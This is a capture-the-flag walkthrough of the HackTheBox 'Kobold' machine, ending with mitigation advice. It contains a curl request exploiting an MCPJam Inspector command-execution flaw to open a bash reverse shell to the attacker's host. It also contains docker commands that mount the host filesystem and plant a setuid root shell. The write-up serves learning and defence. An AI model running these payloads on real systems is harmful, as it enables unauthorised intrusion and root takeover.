---
title: Kobold
os: Linux
difficulty: Easy
tags:
  - Model Context Protocol
  - MCPJam Inspector
  - Docker Group Privilege Escalation
  - CVE-2026-23744
---

# 🛡️ HTB - Kobold (Easy)

<p align="center">
  <img src="https://img.shields.io/badge/Platform-HackTheBox-green?style=for-the-badge&logo=hackthebox" alt="HackTheBox" />
  <img src="https://img.shields.io/badge/OS-Linux-orange?style=for-the-badge&logo=linux" alt="OS Linux" />
  <img src="https://img.shields.io/badge/Difficulty-Easy-green?style=for-the-badge" alt="Easy Difficulty" />
</p>

---

### 💻 Target Information
- **Machine Name:** Kobold
- **Operating System:** Linux
- **Difficulty:** Easy
- **Vulnerabilities:** Unauthenticated RCE in MCPJam Inspector (CVE-2026-23744), Docker Group Privilege Escalation

---

```text
\------------------------------------------------------------------------------------Kobold-Notes--------------------------------------------------------------------------------------------
```

## Step 1 - Reconnaissance

```bash
nmap -A -sS -P -T4  --min-rate 5000 10.129.12.117

Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-03-22 12:58 UTC

Nmap scan report for 10.129.12.117

Host is up (0.23s latency).

Not shown: 997 closed tcp ports (reset)

PORT    STATE SERVICE  VERSION

22/tcp  open  ssh      OpenSSH 9.6p1 Ubuntu 3ubuntu13.15 (Ubuntu Linux; protocol 2.0)

| ssh-hostkey: 

|   256 8c:45:12:36:03:61:de:0f:0b:2b:c3:9b:2a:92:59:a1 (ECDSA)

|_  256 d2:3c:bf:ed:55:4a:52:13:b5:34:d2:fb:8f:e4:93:bd (ED25519)

80/tcp  open  http     nginx 1.24.0 (Ubuntu)

|_http-title: Did not follow redirect to https://kobold.htb/

|_http-server-header: nginx/1.24.0 (Ubuntu)

443/tcp open  ssl/http nginx 1.24.0 (Ubuntu)

| ssl-cert: Subject: commonName=kobold.htb

| Subject Alternative Name: DNS:kobold.htb, DNS:*.kobold.htb

| Not valid before: 2026-03-15T15:08:55

|_Not valid after:  2125-02-19T15:08:55

| tls-alpn: 

|   http/1.1

|   http/1.0

|_  http/0.9

|_http-server-header: nginx/1.24.0 (Ubuntu)

|_ssl-date: TLS randomness does not represent time

|_http-title: Did not follow redirect to https://kobold.htb/

No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).

TCP/IP fingerprint:

OS:SCAN(V=7.94SVN%E=4%D=3/22%OT=22%CT=1%CU=39627%PV=Y%DS=2%DC=T%G=Y%TM=69BF

OS:E798%P=x86_64-pc-linux-gnu)SEQ(SP=104%GCD=1%ISR=109%TI=Z%CI=Z%TS=A)SEQ(S

OS:P=104%GCD=1%ISR=109%TI=Z%CI=Z%II=I%TS=A)OPS(O1=M552ST11NW7%O2=M552ST11NW

OS:7%O3=M552NNT11NW7%O4=M552ST11NW7%O5=M552ST11NW7%O6=M552ST11)WIN(W1=FE88%

OS:W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)ECN(R=Y%DF=Y%T=40%W=FAF0%O=M552N

OS:NSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=

OS:Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=A

OS:R%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=4

OS:0%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=

OS:G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)

Network Distance: 2 hops

Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 23/tcp)

HOP RTT       ADDRESS

1   239.39 ms 10.10.14.1

2   234.20 ms 10.129.12.117

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .

Nmap done: 1 IP address (1 host up) scanned in 47.99 seconds
```

- 🔍 *Aahaa! 443 as well! good.*

- 🔍 *Well there is nothing, no subdomains, no sub directories, literally nothing!*

```text
gobuster vhost -u http://kobold.htb -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-20000.txt --append-domain -t 50

===============================================================

Gobuster v3.6

by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)

===============================================================

[+] Url:             http://kobold.htb

[+] Method:          GET

[+] Threads:         50

[+] Wordlist:        /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-20000.txt

[+] User Agent:      gobuster/3.6

[+] Timeout:         10s

[+] Append Domain:   true

===============================================================

Starting gobuster in VHOST enumeration mode

===============================================================

Progress: 19966 / 19967 (99.99%)

===============================================================

Finished

python3 dirsearch.py -u "https://kobold.htb/" -x 404  

&#x20; _|. _ _  _  _  _ _|_    v0.4.3                 

&#x20;(_||| _) (/_(_|| (_| )                          

&#x20;                                                

Extensions: php, asp, aspx, jsp, html, htm

HTTP method: GET | Threads: 25

Wordlist size: 12294

Target: https://kobold.htb/

[13:00:36] Scanning:                             

[13:02:32] 200 -    4KB - /index.html

Task Completed
```

- 🔍 *After looking at some hints and research, i understood that, its something related kobold ai*

> [!IMPORTANT]
> What is KoboldAI/KoboldCPP?

```text
KoboldAI is a browser-based front-end for AI-assisted writing and text generation. It typically runs on port 5000 or 8000.
```

- 🔍 *also there is one subdomain as well*

```text
&#x20;[!] mcp.kobold.htb 

&#x09;MCP stands for Model Context Protocol - this is a protocol for AI model interactions, often used with:

&#x09;	KoboldAI (a text generation AI interface)

&#x09;

&#x09;	LLM (Large Language Model) servers

&#x09;	AI model management platforms
```

- 🔍 *the reason why didn't saw it in the gobuster is because the wordlist is old and does not contains new ai related subdomains.*

- 🔍 *While looking at the subdomain its a MCP jam inspector*

> [!IMPORTANT]
> What is MCPJam Inspector?

```text
&#x09;A tool for developing/debugging MCP servers (AI model servers)

&#x09;By default, it listens on 0.0.0.0 (all network interfaces) instead of 127.0.0.1 (localhost only)

&#x09;This means it's accessible remotely
```

- 🔍 *while looking for some know vulnerabilities for this, i have found*

> [!IMPORTANT]
> The RCE Vulnerability (CVE-2026-23744):

```text
&#x09;The /api/mcp/connect endpoint accepts a serverConfig object that includes:

&#x09;command: What program to run

&#x09;args: Arguments to pass to that program

&#x09;env: Environment variables

&#x09;The flaw: No validation is performed on these fields. An attacker can send ANY command, and the server will execute it!
```

- 🔍 *Hence we got all we need, lets grab the initial foothold.*

```text
\-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
```

## Step 2 - Initial Foothold

- 🔍 *we can write a bash command that will bind a reverse shell back to our machine*

- 🔍 *Setup a listener*

- 🔍 *then curl*

```bash
curl -k -X POST "https://mcp.kobold.htb/api/mcp/connect" \\

&#x20; -H "Content-Type: application/json" \\

&#x20; -d '{

&#x20;   "serverConfig": {

&#x20;     "command": "/bin/bash",

&#x20;     "args": ["-c", "bash -i >& /dev/tcp/10.10.14.11/4444 0>&1"],

&#x20;     "env": {}

&#x20;   },

&#x20;   "serverId": "exploit"

&#x20; }'
```

- 🔍 *on the listener!*

```text
nc -lvnp 4444

listening on [any] 4444 ...

connect to [10.10.14.11] from (UNKNOWN) [10.129.12.117] 54016

bash: cannot set terminal process group (1529): Inappropriate ioctl for device

bash: no job control in this shell

ben@kobold:/usr/local/lib/node_modules/@mcpjam/inspector$
```

- 🔍 *its ben, so go grab the user flag from, ben's directory*

```text
\--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
```

## Step 3 - Privilege Escalation

- 🔍 *i saw that, on the container we can run, docker commands.*

- 🔍 *It will allow us to mount the whole filesystem into a container, then we can access any file from that container*

- 🔍 *How to do it?*

```bash
newgrp docker

docker run -v /:/hostfs --rm --user root --entrypoint cat privatebin/nginx-fpm-alpine:2.0.2 /hostfs/root/root.txt

* \-v /:/hostfs - Mounts the entire host filesystem to /hostfs inside the container

* \--rm - Removes container after execution

* \--user root - Runs as root inside the container

* \--entrypoint cat - Overrides the default entrypoint to use cat

* privatebin/nginx-fpm-alpine:2.0.2 - The Docker image being used

* /hostfs/root/root.txt - The file to read

ben@kobold:/usr/local/lib/node_modules/@mcpjam/inspector$ newgrp docker

docker run -v /:/hostfs --rm --user root --entrypoint cat privatebin/nginx-fpm-alpine:2.0.2 /hostfs/root/root.txtnewgrp docker

**cc9acf6bd57c6d1caa7dfe72453554d2**
```

- 🔍 *this way you can directly read the whole file system without even gaining any privileges.*

- 🔍 *If aren't satisfied enough with getting a flag, and you wanna gain a shell, then--->*

```bash
newgrp docker

docker run -v /:/hostfs --rm --user root --entrypoint sh privatebin/nginx-fpm-alpine:2.0.2 -c "cp /hostfs/bin/bash /hostfs/tmp/rootbash && chmod +s /hostfs/tmp/rootbash

/tmp/rootbash -p
```

- 🔍 *while i was trying this shell copy thing, it was taking to long and got stuck in between, maybe cause of my low main memory.*

- 🔍 *made it work though!*

```text
ben@kobold:/usr/local/lib/node_modules/@mcpjam/inspector$ newgrp docker

newgrp docker

$ls

&#x09;LICENSE

&#x09;README.md

&#x09;assets

&#x09;bin

&#x09;dist

&#x09;node_modules

&#x09;package.json

$docker run -v /:/hostfs --rm --user root --entrypoint sh privatebin/nginx-fpm-alpine:2.0.2 -c "cp /hostfs/bin/bash /hostfs/tmp/rootbash && chmod +s /hostfs/tmp/rootbash"

$ls

&#x09;LICENSE

&#x09;README.md

&#x09;assets

&#x09;bin

&#x09;dist

&#x09;node_modules

&#x09;package.json

$/tmp/rootbash -p

$ls

&#x09;LICENSE

&#x09;README.md

&#x09;assets

&#x09;bin

&#x09;dist

&#x09;node_modules

&#x09;package.json

#whoami

root
```

- 🔍 *i have used indentation and ls just to let myself know that i am still in the container or not, because i was seeing nothing, complete blank. and got scared! that's why had to use ls as a test to reassure!*

## Mitigations & Security Perspective

> [!IMPORTANT]
> **🛡️ Blue Team Infrastructure & Container Security Assessment**
> Below is the post-exploitation blueprint analyzing every vulnerability and administrative configuration issue exploited in the Kobold environment. Each identified weakness is mapped to its core risk, threat context, and practical defensive remediation strategies.

### 🔴 Unauthenticated Command Execution in MCPJam Inspector (CVE-2026-23744)

> [!WARNING]
> **Vulnerability Profile:**
> The Model Context Protocol (MCP) debugging portal, MCPJam Inspector, was exposed to all network interfaces (`0.0.0.0`) on the subdomain `mcp.kobold.htb`. The `/api/mcp/connect` endpoint accepts a `serverConfig` block with user-defined commands and arguments and executes them without validation.

> [!CAUTION]
> **Risk & Downstream Threat Impact:**
> Exposing internal development, testing, or debugging tools directly to external networks allows attackers to gain arbitrary code execution (RCE) on the server. Since the API does not validate the program or arguments passed in the connection configuration, an external user can easily inject reverse shells, running in the context of the service user (`ben`).

> [!TIP]
> **Defensive Remediation & Detection Strategies:**
> - **Remediation:** Bind local debugging tools exclusively to `127.0.0.1` (localhost).
> - **Remediation:** If external access is necessary, place the portal behind a reverse proxy (e.g., Nginx) that enforces strong authentication (such as mTLS or OAuth).
> - **Detection:** Set up detection rules for outbound network calls initiated by server-side Javascript node modules or developer processes (like `@mcpjam/inspector`).

---

### 🔴 Insecure Docker Group Privilege Delegation

> [!WARNING]
> **Vulnerability Profile:**
> The unprivileged user account `ben` is a member of the local `docker` group, allowing direct access to the Docker socket/daemon.

> [!CAUTION]
> **Risk & Downstream Threat Impact:**
> Docker socket access is equivalent to full root access on a host. An attacker with standard shell access under the `docker` group can execute containers mounting the entire host filesystem (`-v /:/hostfs`), read sensitive files (such as `/root/root.txt`), edit system configurations, or write backdoor SUID binaries to execute commands as `root`.

> [!TIP]
> **Defensive Remediation & Detection Strategies:**
> - **Remediation:** Remove non-administrative users from the `docker` group.
> - **Remediation:** Restrict container capabilities. Enforce rootless Docker mode or implement Docker daemon authorization plugins to restrict volume mounts and privileged container execution.
> - **Detection:** Monitor and alert on Docker commands mounting the host root directory (`/`) or overriding image entrypoints with interactive shells (`/bin/sh` or `/bin/bash`).

